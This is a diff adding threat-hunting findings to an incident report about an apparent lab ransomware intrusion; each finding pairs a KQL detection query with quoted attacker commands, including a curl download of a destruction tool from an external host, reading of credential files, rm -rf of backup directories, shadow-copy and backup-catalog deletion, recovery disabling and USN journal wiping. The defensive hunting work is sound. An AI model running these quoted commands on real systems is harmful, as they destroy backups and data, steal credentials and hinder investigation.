@@ -219,6 +219,560 @@ The attack succeeded due to multiple detection and prevention gaps. SSH lateral 
 
 The following sections document the investigative queries used during the hunt, along with the corresponding evidence observed in endpoint telemetry to support each finding.
 
-### [Add your queries here as you mentioned]
+### Finding: SSH Lateral Movement to Backup Server
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine has "ssh" or ProcessCommandLine has "ssh"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"ssh.exe" backup-admin@10.1.0.189`
+
+**Why it matters:**  
+SSH connection from a workstation to backup infrastructure indicates lateral movement to critical assets.
+
+---
+
+### Finding: Attack Source Identification
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceNetworkEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-"
+| project TimeGenerated, DeviceName, LocalIP, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`10.1.0.108`
+
+**Why it matters:**  
+Identifies the compromised workstation initiating the attack on backup infrastructure.
+
+---
+
+### Finding: Compromised Account on Backup Server
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceLogonEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| order by TimeGenerated desc
+| project TimeGenerated, DeviceName, AccountName, ActionType, LogonType, RemoteIP, RemoteDeviceName
+| where ActionType == "LogonSuccess"
+| summarize account = count() by AccountName
+```
+
+**Evidence observed:**  
+`backup-admin`
+
+**Why it matters:**  
+Administrative backup account provides full access to backup infrastructure and stored credentials.
+
+---
+
+### Finding: Backup Directory Enumeration
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where InitiatingProcessCommandLine has "ls" or ProcessCommandLine has "ls"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`ls --color=auto -la /backups/`
+
+**Why it matters:**  
+Directory listing reveals backup structure and targets for destruction.
+
+---
+
+### Finding: Backup Archive Discovery
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where InitiatingProcessCommandLine has "find" or ProcessCommandLine has "find"
+| where ProcessCommandLine contains "backup"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`find /backups -name *.tar.gz`
+
+**Why it matters:**  
+Searching for archive files indicates targeting of backup data for destruction.
+
+---
+
+### Finding: Local Account Enumeration
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where ProcessCommandLine contains "passwd"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`cat /etc/passwd`
+
+**Why it matters:**  
+Account enumeration provides understanding of user base and potential privilege escalation paths.
+
+---
+
+### Finding: Scheduled Job Reconnaissance
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where InitiatingProcessCommandLine has "cat" or ProcessCommandLine has "cat"
+| where ProcessCommandLine contains "cron"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`cat /etc/crontab`
+
+**Why it matters:**  
+Understanding backup schedules allows attackers to time destruction for maximum impact.
+
+---
+
+### Finding: External Tool Download
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where ProcessCommandLine contains "curl"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z`
+
+**Why it matters:**  
+Downloading destruction tools from external infrastructure demonstrates pre-planned attack methodology.
+
+---
+
+### Finding: Credential File Access
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where ProcessCommandLine contains "cred"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`cat /backups/configs/all-credentials.txt`
+
+**Why it matters:**  
+Credential harvesting enables lateral movement and privilege escalation across the environment.
+
+---
+
+### Finding: Mass Backup Destruction
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where InitiatingProcessCommandLine contains "back" or ProcessCommandLine contains "bac"
+| where ProcessCommandLine contains "rm"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`rm -rf /backups/archives /backups/azuki-adminpc /backups/azuki-fileserver /backups/azuki-logisticspc /backups/config-backups /backups/configs /backups/daily /backups/database-backups /backups/databases /backups/fileserver /backups/logs /backups/monthly /backups/weekly /backups/workstations`
+
+**Why it matters:**  
+Comprehensive deletion of all backup directories eliminates recovery options before ransomware deployment.
+
+---
+
+### Finding: Backup Service Stopped
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where InitiatingProcessCommandLine contains "systemctl stop" or ProcessCommandLine contains "systemctl stop"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`systemctl stop cron`
+
+**Why it matters:**  
+Stopping backup service prevents new backups from being created during the attack.
+
+---
+
+### Finding: Backup Service Permanently Disabled
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-back"
+| where InitiatingProcessCommandLine contains "systemctl disable" or ProcessCommandLine contains "systemctl disable"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`systemctl disable cron`
+
+**Why it matters:**  
+Disabling service ensures backups will not resume even after system restart.
+
+---
+
+### Finding: Remote Execution Tool Identification
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine contains "wmic" or ProcessCommandLine contains "PsExec"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`PsExec64.exe`
+
+**Why it matters:**  
+PsExec enables remote command execution across Windows systems for ransomware distribution.
+
+---
+
+### Finding: Ransomware Deployment Command
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine contains "wmic" or ProcessCommandLine contains "PsExec"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe`
+
+**Why it matters:**  
+Full command reveals target system, compromised credentials, and ransomware payload location.
+
+---
+
+### Finding: Ransomware Payload Identification
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine contains "wmic" or ProcessCommandLine contains "PsExec"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`silentlynx.exe`
+
+**Why it matters:**  
+Identifies the ransomware payload for threat hunting and IOC distribution.
+
+---
+
+### Finding: Shadow Copy Service Stopped
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine contains "net" and ProcessCommandLine contains "vss"
+| where ProcessCommandLine contains "stop"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"net" stop VSS /y`
+
+**Why it matters:**  
+Stopping VSS prevents creation of new shadow copies during encryption.
+
+---
+
+### Finding: Backup Engine Service Stopped
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine contains "net" and ProcessCommandLine contains "wbengine"
+| where ProcessCommandLine contains "stop"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"net" stop wbengine /y`
+
+**Why it matters:**  
+Stopping Windows Backup engine prevents automated backup operations during attack.
+
+---
+
+### Finding: Process Termination to Unlock Files
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "taskkill"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"taskkill" /F /IM sqlservr.exe`
+
+**Why it matters:**  
+Terminating SQL Server releases database file locks for successful encryption.
+
+---
+
+### Finding: Shadow Copy Deletion
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine contains "delete" or ProcessCommandLine contains "delete"
+| where ProcessCommandLine contains "vss"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"vssadmin" delete shadows /all /quiet`
+
+**Why it matters:**  
+Deleting all shadow copies eliminates point-in-time recovery options.
+
+---
+
+### Finding: Shadow Storage Limitation
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where InitiatingProcessCommandLine contains "resize" or ProcessCommandLine contains "size"
+| where ProcessCommandLine contains "vss"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"vssadmin" resize shadowstorage /for=C: /on=C: /maxsize=401MB`
+
+**Why it matters:**  
+Limiting shadow storage prevents new shadow copies from being created.
+
+---
+
+### Finding: System Recovery Disabled
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "bcdedit"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"bcdedit" /set {default} recoveryenabled No`
+
+**Why it matters:**  
+Disabling boot recovery prevents automatic repair after encryption damage.
+
+---
+
+### Finding: Backup Catalog Deletion
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "delete cat"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"wbadmin" delete catalog -quiet`
+
+**Why it matters:**  
+Deleting backup catalog removes tracking of available restore points.
+
+---
+
+### Finding: Registry Persistence Mechanism
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceRegistryEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where RegistryKey has_any (
+    @"CurrentVersion\Run",
+    @"CurrentVersion\RunOnce",
+    @"Winlogon",
+    @"CurrentControlSet\Services"
+)
+| project TimeGenerated, ActionType, DeviceName, RegistryKey, RegistryValueName, RegistryValueData
+| order by TimeGenerated
+```
+
+**Evidence observed:**  
+`WindowsSecurityHealth`
+
+**Why it matters:**  
+Registry autorun key provides persistence across system reboots.
+
+---
+
+### Finding: Scheduled Task Persistence
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki-sl"
+| where ProcessCommandLine contains "sch"
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`Microsoft\Windows\Security\SecurityHealthService`
+
+**Why it matters:**  
+Scheduled task provides reliable persistence with configurable triggers.
+
+---
+
+### Finding: Forensic Journal Deletion
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains ("fsutil")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`"fsutil.exe" usn deletejournal /D C:`
+
+**Why it matters:**  
+Deleting USN journal destroys forensic timeline and impedes investigation.
+
+---
+
+### Finding: Ransom Note Deployment
+
+```kql
+let start = datetime(2025-11-10);
+let end   = datetime(2025-12-10);
+DeviceProcessEvents
+| where TimeGenerated between (start .. end)
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains ("silent")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+**Evidence observed:**  
+`SILENTLYNX_README.txt`
+
+**Why it matters:**  
+Ransom note indicates successful encryption and attacker's payment demands.
 
 </details>
